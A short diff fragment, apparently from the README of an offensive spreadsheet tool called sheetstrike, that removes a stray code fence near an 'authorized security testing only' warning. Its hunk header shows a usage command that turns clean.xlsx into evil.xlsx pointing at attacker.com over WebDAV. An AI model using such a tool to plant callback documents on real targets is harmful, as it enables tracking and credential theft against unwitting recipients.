@@ -29,4 +29,4 @@ python3 sheetstrike.py -i clean.xlsx -o evil.xlsx -m webdav -H attacker.com --ht
 - Detecting document leaks
 
 ⚠️ **For authorized security testing only**
-```
+
